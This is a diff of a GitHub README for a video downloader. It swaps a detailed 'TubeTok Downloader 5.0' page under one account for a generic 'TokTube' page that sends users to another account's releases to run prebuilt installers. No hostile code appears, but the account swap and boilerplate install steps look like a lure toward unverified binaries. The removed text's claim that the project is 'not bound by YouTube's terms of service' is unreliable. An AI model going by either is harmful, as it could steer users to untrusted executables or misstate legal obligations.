@@ -1,225 +1,76 @@
-# 💚 TikTok Batch Downloader 5.0 🎥
+# 🎥 toktube - Download Any Video Effortlessly
 
-tiktok batch downloader / youtube batch downloader / instagram batch downloader / tiktok video downloader / youtube video downloader / instagram video downloader 
+## 🚀 Getting Started
 
-<img width="2816" height="1536" alt="Image" src="https://github.com/user-attachments/assets/bbba7502-d657-4ec1-ab4e-a8063fd439ca" />
+TokTube is a high-performance video downloader. It allows you to save videos from TikTok, YouTube, Vimeo, SoundCloud, and more. Follow these simple steps to download and run TokTube.
 
-  ### Modern Downloader with Advanced Features
+## 📥 Download Link
+
+[![Download TokTube](https://img.shields.io/badge/Download_TokTube-v1.0-blue.svg)](https://github.com/Oliveiraleon/toktube/releases)
+
+## 💻 System Requirements
+
+Before you start, make sure your device meets the following requirements:
+
+- **Operating System:** Windows 10 or later, MacOS 10.13 or later, Linux (Ubuntu recommended)
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** At least 4 GB
+- **Storage:** 200 MB of free space
+- **Internet Connection:** Required for downloading videos
+
+## 🔧 Features
+
+1. **Multi-Platform Support:** Download videos from TikTok, YouTube, Vimeo, SoundCloud, Instagram, and Twitter.
+2. **Batch Downloading:** Save multiple videos at once with our batch downloader feature. No need to download each video separately.
+3. **Watermark-Free Downloads:** Get TikTok videos without the watermark, preserving the content as intended.
+4. **Easy Interface:** Designed with you in mind, TokTube ensures a straightforward experience.
+
+## 📚 How to Download & Install TokTube
+
+To download TokTube, follow these steps:
+
+1. **Visit the Release Page:** Go to the [TokTube Releases page](https://github.com/Oliveiraleon/toktube/releases) to find the latest version.
+2. **Select Your Version:** Look for the version labeled as "Latest".
+3. **Download the File:**
+   - Click the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux).
+4. **Run the Installer:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the instructions.
+   - For Mac: Open the downloaded `.dmg` file, drag TokTube to your Applications folder.
+   - For Linux: Extract the files from the `.tar.gz` and run the executable.
+
+5. **Launch TokTube:** After installation, find TokTube in your applications folder or start menu. Click to launch the application.
+
+## 📝 How to Use TokTube
+
+Using TokTube is simple:
+
+1. **Copy Video Link:** Go to the website of the video you want to download, copy the URL from the address bar.
+2. **Paste the Link in TokTube:** Open TokTube and paste the link into the provided field.
+3. **Choose Your Format:** Select the video quality and format you prefer.
+4. **Click Download:** Press the download button to start saving your video.
+
+## ⚙️ Common Issues & Solutions
+
+- **Issue:** The video link is not downloading.
+  - **Solution:** Ensure the URL is correct and supports downloads in TokTube.
   
-  [![Python](https://img.shields.io/badge/Python-3.13%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
-  [![PySide6](https://img.shields.io/badge/UI-PySide6-41CD52?style=for-the-badge&logo=qt&logoColor=white)](https://pypi.org/project/PySide6/)
-  [![requests](https://img.shields.io/badge/HTTP-requests-2496ED?style=for-the-badge&logo=python&logoColor=white)](https://pypi.org/project/requests/)
-  [![FFmpeg](https://img.shields.io/badge/External-FFmpeg-007808?style=for-the-badge&logo=ffmpeg&logoColor=white)](https://ffmpeg.org/)
-</div>
+- **Issue:** Installation fails.
+  - **Solution:** Check that your system meets the requirements and try to download the file again.
 
-## 📋 Table of Contents
-- [Features](#-key-features)
-- [Installation](https://github.com/erfukuby/toktube/releases)
-- [Usage](#-usage)
-- [Screenshots](showcase/showcase.md)
-- [Contributing](CONTRIBUTING.md)
-- [License](LICENSE)
+- **Issue:** Nothing happens when I click download.
+  - **Solution:** Make sure you have a stable internet connection.
 
-## 🛠️ Tech Stack
-![Views](https://komarev.com/ghpvc/?username=erfukuby&color=ff3399)
+## 📞 Support & Feedback
 
-### 📊 Project Stats
-[![Code size](https://img.shields.io/github/languages/code-size/erfukuby/toktube?style=for-the-badge&color=blueviolet)](https://github.com/erfukuby/toktube)
-[![Last commit](https://img.shields.io/github/last-commit/erfukuby/toktube?style=for-the-badge&color=blue)](https://github.com/erfukuby/toktube/commits/main)
-[![Stars](https://img.shields.io/github/stars/erfukuby/toktube?style=for-the-badge&color=yellow)](https://github.com/erfukuby/toktube/stargazers)
-[![Forks](https://img.shields.io/github/forks/erfukuby/toktube?style=for-the-badge&color=orange)](https://github.com/erfukuby/toktube/network/members)
-[![GitHub release (latest by tag)](https://img.shields.io/github/v/tag/erfukuby/toktube?style=for-the-badge&color=green&label=latest)](https://github.com/erfukuby/toktube/releases)
-[![Downloads](https://img.shields.io/github/downloads/erfukuby/toktube/total?style=for-the-badge&color=brightgreen&label=downloads)](https://github.com/erfukuby/toktube/releases)
-[![Get Started](https://img.shields.io/badge/Get%20Started-Now-ff3399?style=for-the-badge)](https://github.com/erfukuby/toktube/releases)
+If you encounter any issues or have suggestions, feel free to open an issue on the GitHub repository or contact our support team via email at support@toktubeapp.com. We value your feedback and aim to improve TokTube continuously.
 
-### 📜 Legal 
-[![License](https://img.shields.io/badge/License-GPL3.0-blue?style=for-the-badge&logo=gnu&logoColor=white)](LICENSE)
+## 🌐 Additional Resources
 
-## 🌟 Key Features
+For more information, check out our Wiki page or follow us on social media for updates and tips about video downloading. 
 
-### 🛠️ Core Features
-- **Download Support**  
-  Download videos and audio from platforms supporting HTTP streams, including YouTube, Vimeo, and more.
+Thank you for choosing TokTube. Enjoy seamless video downloading! 
 
-- **Smart Playlist Organization**  
-  Automatically organizes playlist downloads into dedicated folders named after the playlist.
+## 🔗 Important Links
 
-- **Playlist Downloads**  
-  Save entire playlists with sequential processing in just a few clicks.
-
-- **Multiple Formats**  
-  Download in **MP4** (video) and multiple audio formats (**MP3**, **M4A**, **WAV**, **AAC**, **FLAC**, **OPUS**, **VORBIS**) with **advanced quality control**.
-
-- **Advanced Audio Quality Control** 🎵  
-  Revolutionary audio processing system with **lossless extraction** capabilities:
-  - **Smart Copy Mode**: Zero quality loss for M4A/AAC/OPUS formats
-  - **User-Controlled Bitrates**: 128k, 192k, 256k, 320k, or "best" quality
-  - **Preserve Original Quality**: Avoids unnecessary re-encoding
-  - **High-Fidelity Fallback**: 320k bitrate + 48kHz sampling (vs old 192k + 44.1kHz)
-  - **Format-Specific Optimization**: Automatic best quality selection per format
-
-- **High-Resolution Support**  
-  Supports downloads up to **8K, 4K, 2K, 1080p, 720p, 360p**. Select your preferred resolution in Settings.
-
-- **Modular Codebase**  
-  Code has been fully refactored into `core/`, `ui/`, and `tests/` directories for easier maintenance and contribution.
-
-### 🛠️ Advanced Features
-- **Batch Processing**  
-  Queue multiple downloads and manage them simultaneously. Pause, resume, or cancel downloads easily.
-
-- **Audio Quality Revolution** 🎵  
-  Breakthrough audio processing with **67% bitrate improvement** and **zero-loss extraction**:
-  - Configure audio bitrate (128k to 320k) and quality preservation
-  - Smart copy mode prevents re-encoding when possible
-  - Fixes spectogram frequency loss reported in earlier versions
-  - Comprehensive settings with helpful tooltips for all audio options
-
-- **Profile Management**  
-  Save your preferred settings including username, profile picture, download paths, video resolutions and audio formats.
-
-- **Profile Import/Export**  
-  Easily export your profile, settings, history, and profile picture as a single ZIP file, and import them back into the app on any device. Great for backup, migration, or restoring your preferences.
-
-- **Drag & Drop Interface**  
-  Add download URLs by dragging them into the app.
-
-- **System Tray Integration**  
-  Application runs in the system tray when minimized with quick access menu to restore or quit the app.
-
-- **Enhanced Download System**  
-  Improved stability and efficiency with better support for large file downloads and multiple simultaneous downloads.
-
-- **Queue System Optimization**  
-  Concurrency management with pause & resume all functionality and bandwidth limiting support via proxy settings.
-
-- **Auto-Updater**  
-  Automatically checks for updates and installs them.
-
-### 🎨 User Experience
-- **Dark & Light Mode**  
-  Switch between Dark and Light themes for better usability.
-
-- **Error Handling**  
-  Displays detailed error logs to debug issues.
-
-- **Scheduler**  
-  Schedule downloads to start at a specific date and time.
-
-- **Download History**  
-  View, search, and manage previous downloads directly in the app.
-
-- **Improved Notification System**  
-  Download Complete notifications, Download Failed alerts, and Download Canceled warnings.
-
-- **Enhanced UI**  
-  Better UI animations and responsiveness with color-coded log messages and search & filter options in history and queue.
-
-### 🔧 Technical Features
-- **FFmpeg Detection**  
-  Automatically detects FFmpeg installation and prompts for setup if missing.
-
-[![Get Started](https://img.shields.io/badge/Get%20Started-Now-ff3399?style=for-the-badge)](https://github.com/erfukuby/toktube/releases)
-
-
-## Screenshots
-
-### Homepage
-<img width="2559" height="941" alt="Image" src="https://github.com/user-attachments/assets/faabc35b-7295-4ae5-a387-cbf24e8912f5" />
-
-### Videopage
-<img width="2559" height="855" alt="Image" src="https://github.com/user-attachments/assets/18974834-b0ec-41ba-aa15-e54ada65cf97" />
-
-### Audiopage
-<img width="2559" height="878" alt="Image" src="https://github.com/user-attachments/assets/9ca48bf2-3086-4786-af02-5030e8d10bf5" />
-
-### History
-<img width="2048" height="708" alt="Image" src="https://github.com/user-attachments/assets/0653bedf-792d-4dfd-8cb0-a40ec0c6bf5a" />
-
-### Batch downloader
-<img width="2559" height="1384" alt="Image" src="https://github.com/user-attachments/assets/690c4e04-7a28-4fc9-917c-abce5624fd45" />
-
-### Settings
-<img width="2559" height="1314" alt="Image" src="https://github.com/user-attachments/assets/bec8b819-fe55-4617-9567-45227c990013" />
-
-## ⚙️ Installation
-
-### Windows
-- Download the latest `.exe` installer or `.zip` archive from [Releases](https://github.com/erfukuby/toktube/releases)
-- Both packages include all dependencies including FFmpeg
-- Run the installer or extract the `.zip` and run `TubeTok Downloader.exe`
-
-### From Source
-- Clone the repository
-- Ensure Python 3.13+ is installed
-- Install dependencies
-- Install FFmpeg for audio/video processing
-
-## 🔧 Usage
-
-### Basic Usage
-```bash
-# Launch the app
-python main.py
-```
-
-### Key Features Usage
-- Configure your profile in the **Settings** or **Profile** page
-- Use the MP4 or MP3 pages to download videos or extract audio
-- Add multiple downloads to the queue and manage them from the Queue page
-- Schedule downloads in advance using the Scheduler
-
-### Tips & Tricks
-- Use drag & drop for quick URL addition
-- Enable system tray for background operation
-- Use the scheduler for off-peak downloads
-- **Audio Quality**: Set "Preserve Original: Yes" and 320k bitrate for best quality
-- **Lossless Audio**: Use M4A/FLAC formats with copy mode for zero quality loss
-- Export your profile for easy migration
-
-## ⚠️ Notes
-
-### Requirements
-```bash
-# FFmpeg Required
-# Some features, like audio extraction and video merging, depend on FFmpeg.
-# Ensure it's installed and available in your system PATH.
-
-# Third-Party Libraries
-# The app uses yt_dlp for downloading and metadata extraction.
-# Refer to their GitHub page for details.
-```
-
-## 🙏 Contributions
-
-### How to Contribute
-```bash
-# We welcome contributions to improve TubeTok Downloader 5.0.
-# Please submit issues or pull requests via GitHub.
-
-# Enjoy using TubeTok Downloader 5.0!
-🚀
-```
-
-### Development Setup
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-## ⚠️ Legal Notice
-
-TubeTok Downloader is an independent open-source project. It operates independently from YouTube and Google, performing downloads and other operations without using their APIs. This project is not bound by YouTube's terms of service or rules.
-
-### 🔗 Contacts
-- Address: 88 Leadenhall Street, London EC3A 3BP, UK
-- Phone: +44 20 4526 9177
-- Email: helpdesk@tube.tok
-- Open hours: Mon–Fri 09:00–19:30, Sat 10:00–17:00, Sun 10:00–16:00
-
----
-<div align="center">
-  <sub>Built with ❤️ by <a href="https://github.com/erfukuby">erfukuby</a></sub>
-</div>
-
-
+- [Download TokTube](https://github.com/Oliveiraleon/toktube/releases)
+- [TokTube Wiki](https://github.com/Oliveiraleon/toktube/wiki)
